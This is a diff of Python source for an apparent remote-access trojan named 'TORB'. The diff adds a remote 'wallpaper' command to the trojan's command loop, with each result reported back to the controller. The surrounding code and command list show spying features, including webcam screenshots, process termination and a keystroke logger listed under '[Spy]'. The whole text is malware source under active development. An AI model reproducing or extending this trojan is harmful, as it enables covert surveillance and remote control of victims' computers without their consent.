@@ -295,6 +295,17 @@ def main():
 					print "Webcam not found"
 					relayMe("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
 				q = z
+			# Set a new desktop wallpaper
+			elif "wallpaper" in z:
+				print "Setting wallpaper..."
+				b = z[10:]
+				try:
+					relayMe("TORB Notification\n\nSetting Desktop wallpaper to %s..." % (b))
+					setWallpaper(b)
+				except:
+					print "TORB Error\n\nTORB was unable to set wallpaper..."
+					relayMe("TORB Error\n\nTORB was unable to set wallpaper... Possible UAC restriction.")
+				q = z
 			# Put server to rest / Stop all commands
 			elif z == "sleep":
 				print "Entering sleep state..."
@@ -439,6 +450,17 @@ def main():
 				except:
 					print "Webcam not found"
 					comm_backup("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
+				q = z
+			# Set a new desktop wallpaper
+			elif "wallpaper" in z:
+				print "Setting wallpaper..."
+				b = z[10:]
+				try:
+					comm_backup("TORB Notification\n\nSetting Desktop wallpaper to %s..." % (b))
+					setWallpaper(b)
+				except:
+					print "TORB Error\n\nTORB was unable to set wallpaper..."
+					comm_backup("TORB Error\n\nTORB was unable to set wallpaper... Possible UAC restriction.")
 				q = z
 			# Put server to rest / Stop all commands
 			elif z == "sleep":
@@ -1064,12 +1086,22 @@ def procTerminate(selID):
 	elif bckChck == 1:
 		comm_backup("TORB Notification\n\nProcess #%s Terminated" % (selID))
 
+# Set new desktop wallpaper by specifying image directory
+def setWallpaper(wallSet):
+	SPI_SETDESKWALLPAPER = 20 
+	ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wallSet , 0)
+	if bckChck == 0:
+		relayMe("TORB Notification\n\nWallpaper set to %s successfully." % (wallSet))
+	elif bckChck == 1:
+		comm_backup("TORB Notification\n\nWallpaper set to %s successfully." % (wallSet))
+
 cmdList = """
 [Fun]:
 	msg [message] - Display Windows Message
 	beep - Play Windows Alert Sound
 	opencd - Open CD Drive
 	teleport [http://example.com/] - Navigate to URL
+	wallpaper [image dir] - Set Desktop Wallpaper
 
 [Spy]:
 	keylog - Monitor Keystrokes
